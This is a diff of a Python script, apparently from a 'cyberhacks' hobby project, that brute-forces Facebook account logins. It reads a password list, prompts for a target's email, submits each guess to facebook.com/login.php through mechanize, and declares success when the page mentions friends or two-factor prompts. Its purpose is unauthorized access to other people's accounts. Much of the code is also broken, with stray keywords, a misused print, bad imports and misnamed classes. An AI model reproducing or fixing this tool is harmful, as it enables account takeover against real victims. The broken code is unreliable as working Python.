@@ -2,6 +2,7 @@ from http.client import REQUEST_TIMEOUT
 import sys 
 import os
 import time
+from wsgiref import headers
 if sys.version_info[0] !=3:
    print(' Required version of python3 .please install python3 then restart')
    print('restart programme after that')
@@ -23,7 +24,7 @@ import webbrowser
 import urllib
 from nturl2path import url2pathname
 import time
-from urllib.request import urlopen 
+from urllib.request import URLopener, urlopen 
 
 3<4
 G=444333
@@ -39,9 +40,16 @@ print('FOLLOW US ON FB:www.facebook.com/cyberhacks6')
 webbrowser.open('www.facebook.com/cyberhacks6')
 file=open('password.txt','r')
 
-def payload( email, password):
-    urlopen = 'https://www.facebook.com/login.php'
-    header = {'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'}
+import mechanize 
+browser = mechanize.browser()
+browser.addheaders=[('User-Agent',headers['User-Agent'])]
+browser.set_handle_robots(False)
+excepthandler
+ConnectionError
+print("FAILED TO CONNECT TO THE INTERNET")
+
+urlopen = 'https://www.facebook.com/login.php'
+header = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'}
 email = input("enter email of target:")
 print("\nPlease wait while the modules do the hacking",email+"")
 print("\nTrying passwords from list")
@@ -51,15 +59,15 @@ while FileType :
     i+=1
     if len(password) < 10:
       continue
-print=str(' Trying >>>"password"')
-response = webbrowser.BackgroundBrowser.open(urlopen);
+    print=str(i) +" : ",password
+    response = browser.open(urlopen)
 
 Try
 If; response; code == 200
-webbrowser.select_form(nr=0)()
-webbrowser.form['email']=email
-webbrowser.form['pass']=password
-response = webbrowser.submit()
+browser.select_form(nr=0)()
+browser.form['email']=email
+browser.form['pass']=password
+response = browser.submit()
 response_data = response.read()
 'find friends' in response_data or 'two-factor authentication' in response_data or 'security code' in response_data;
 print("your password is : ",password)
